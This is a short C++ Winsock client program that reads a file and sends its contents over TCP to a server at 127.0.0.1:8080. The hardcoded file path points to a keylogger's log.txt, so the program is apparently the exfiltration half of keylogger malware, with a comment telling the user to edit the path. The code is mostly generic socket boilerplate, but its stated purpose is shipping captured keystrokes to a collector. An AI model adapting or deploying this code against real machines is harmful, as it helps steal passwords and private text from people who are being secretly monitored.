#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib") // Link with Winsock library

using namespace std;

void sendFile(SOCKET socket, const char* filePath) {
	// Open the file in binary mode
	FILE* file = fopen(filePath, "rb"); // rb = read binary

	// Check if file is open
	if (!file) return;

	// Buffer for reading file lines
	char buffer[1024];

	// Read and send file content line by line
	while (fgets(buffer, sizeof(buffer), file) != nullptr) {
		// Send the line over the socket
		int bytesSent = send(socket, buffer, strlen(buffer), 0);
		if (bytesSent == SOCKET_ERROR) break;
	}

	// Close the file after sending
	fclose(file);
}

int main()
{
	// Initialize Winsock
	WSADATA wsaData;
	int wsaInit = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (wsaInit != 0) return -1;

	// Creating socket
	SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (clientSocket == INVALID_SOCKET) {
		WSACleanup();
		return -1;
	}

	// Specifying the server address
	sockaddr_in serverAddress;
	serverAddress.sin_family = AF_INET;
	serverAddress.sin_port = htons(8080);
	serverAddress.sin_addr.s_addr = inet_addr("127.0.0.1"); // Connect to localhost // Connect to localhost

	// Connecting to the server
	if (connect(clientSocket, (sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
		closesocket(clientSocket);
		WSACleanup();
		return -1;
	}

	// Send the content of the file to the server
	sendFile(clientSocket, "C:\\Users\\user\\Desktop\\Keylogger\\log.txt");
	// Should be edited with the file path

	// Closing the client socket
	closesocket(clientSocket);

	// Cleanup Winsock
	WSACleanup();

	return 0;
}